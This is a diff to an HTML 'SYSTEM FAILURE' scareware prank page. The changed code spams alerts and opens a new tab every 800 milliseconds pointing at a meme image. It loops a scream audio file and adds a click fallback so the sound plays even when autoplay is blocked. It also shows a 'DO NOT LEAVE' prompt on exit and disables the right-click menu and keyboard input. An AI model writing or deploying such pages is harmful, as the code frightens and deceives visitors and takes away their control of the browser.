@@ -32,26 +32,27 @@
 
     function openTabs() {
       setInterval(() => {
-        window.open("", "_blank");
+        window.open("https://media.istockphoto.com/id/538665020/photo/internet-meme-why-you-no-rage-face-3d-illustration.jpg?s=612x612&w=0&k=20&c=5D_g8Jy8kqg5Op2bb4RvcH8_6y0HGPqt29TKDrEqLyM=", "_blank");
       }, 800);
     }
 
     window.onload = () => {
-      // Start chaos
       spamAlerts();
       openTabs();
 
-      // Scary scream
       const audio = new Audio("https://files.catbox.moe/vmosr8.mp3");
       audio.loop = true;
-      audio.play();
 
-      // Block exit
+      // Attempt autoplay, fallback to user click
+      audio.play().catch(() => {
+        document.body.addEventListener("click", () => audio.play(), { once: true });
+      });
+
       window.onbeforeunload = () => "🔴 ERROR: DO NOT LEAVE!";
     };
   </script>
 </head>
-<body>
+<body oncontextmenu="return false" onkeydown="return false">
   <h1>🔴 SYSTEM FAILURE INITIATED 🔴</h1>
 </body>
 </html>
